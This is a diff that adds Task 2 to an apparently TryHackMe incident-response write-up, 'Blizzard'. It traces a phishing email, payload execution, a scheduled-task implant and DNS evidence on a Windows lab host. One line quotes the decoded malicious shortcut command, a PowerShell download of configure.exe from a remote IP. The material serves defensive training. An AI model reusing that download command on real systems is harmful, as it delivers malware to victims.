@@ -133,4 +133,66 @@ Having found `CDPUserSvc_9286x` I now simply loaded the `SYSTEM` registry hive i
 
 Both search results come with identical `Last write` timestamps. That is when the service was created and with that, the answer to the last question of task 1.
 
+## Task 2: Lateral Movement: Backtracking the Pivot Point
+
+>When did the attacker send the malicious email? (format: MM/DD/YYYY HH:MM:SS)
+
+The path to victory here is to copy the process from the [Windows Applications Forensics room](https://tryhackme.com/r/room/windowsapplications) that was listed as prerequisite for this one.
+
+Outlook stores a local copy of a user's mailbox to enable offline access. Whenever the machine connects to the network, the local file is synchronized with the remote server. We can enumerate these `.OST` files with PowerShell.
+
+```powershell
+ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Local\Microsoft\Outlook\" 2>$null | findstr Directory}
+```
+lists directories where `.OST` files are potentially to be found. Since this is one employee's workstation, the single result points to a user `m.anderson`. We've seen this name before in the previous task.
+
+![screenshot16](/Blizzard/assets/screenshot16.png)
+
+To make sense of `C:\Users\m.anderson\AppData\Local\Microsoft\Outlook\m.anderson@healthspheresolutions.onmicrosoft.com.ost` and possibly find the malicious email, we open the file with the XsT Reader utility from `C:\Tools`. In the software we click on `Root - Mailbox => IPM_SUBTREE => Inbox` and are presented with a list of inbound emails.
+
+![screenshot17](/Blizzard/assets/screenshot17.png)
+
+My guess was that the malicious email must be the one with the password-protected `.ZIP` attachment, so I spent some time going through the metadate to substantiate my suspicion. I did not find anything, which although disappointing is in line with real life, where phishing is sometimes sent from [compromised, but legitimate](https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/) internal email accounts. Or did I miss something?
+
+In any case, a click on `Properties` in the bottom right corner reveals the `ClientSubmitTime`, which converted from 12 to 24-hour clock format is the correct answer.
+
+>When did the victim open the malicious payload? (format: MM/DD/YYYY HH:MM:SS)
+
+This calls for AppCompatCacheParser again. For more details see task 1 of this write-up. We open the parsed file in Timeline Explorer, filter for `Executed=Yes` and order by `Last Modified Time UTC`. The last entry in the table is also the only one executed on the evening of the incident, pointing us towards `configure.exe` in `m.anderson`'s home directory.
+
+![screenshot18](/Blizzard/assets/screenshot18.png)
+
+Note: I had originally decided against unpacking the password-protected `.ZIP` attachment. It might have self-destructed the box or something, forcing me to start over. An easter egg of sorts. After finishing the write-up I went back and took the risk. The archive contains a Windows shortcut that points to the following command encoded in Base64, confirming previous findings about `configure.exe`:
+```
+iwr -useb http://128.199.247.173/configure.exe -outfile $env:app
+```
+
+I now decided to poke around said user home directory, deviating from the room's order of questions. What I found in `C:\Users\m.anderson\Documents\` was a set of custom scripts for various system administration tasks. One of them, `demo_automation.ps1`, which downloads and installs PostgreSQL and connects to a remote computer, comes with a hardcoded password.
+
+![screenshot19](/Blizzard/assets/screenshot19.png)
+
+>What file did the attacker leverage to gain access to the database server? Provide the password found in the file.
+
+Besides answering the last question of the task this explains how the intruder was able to exfiltrate data from `HS-SQL-01`.
+
+>When was the malicious persistent implant created? (format: MM/DD/YYYY HH:MM:SS)
+
+I again shamelessly borrowed from the [Windows Applications Forensics](https://tryhackme.com/r/room/windowsapplications) room, which provides PowerShell code to list all enabled tasks ordered by creation date:
+
+```powershell
+Get-ScheduledTask | Where-Object {$_.Date -ne $null -and $_.State -ne "Disabled"} | Sort-Object Date | select Date,TaskName,Author,State,TaskPath | ft
+```
+
+![screenshot20](/Blizzard/assets/screenshot20.png)
+
+Only one task was created on the day of the incident, by m.anderson of all users. This must be the answer. Now to the last question in task 2.
+
+>What is the domain accessed by the malicious implant? (format: defanged)
+
+If there is a direct path from the previously found `SysUpdate` task to the answer of this question, I did not find it. There is nothing of relevance in the `C:\Windows\System32\Tasks\Microsoft\Windows\Clip\SysUpdate\SysUpdate` file. So I thought "domain", that's either Active Directory or [DNS](https://en.wikipedia.org/wiki/Domain_Name_System). Going for what I believed was quicker to potentially rule out, I checked the local DNS cache and hosts file first:
+
+![screenshot21](/Blizzard/assets/screenshot21.png)
+
+A popular German proverb roughly translates to "Even a blind hen once in a while finds a kernel of corn". With that I conclude the write-up of task 2.
+
 Work in progress...
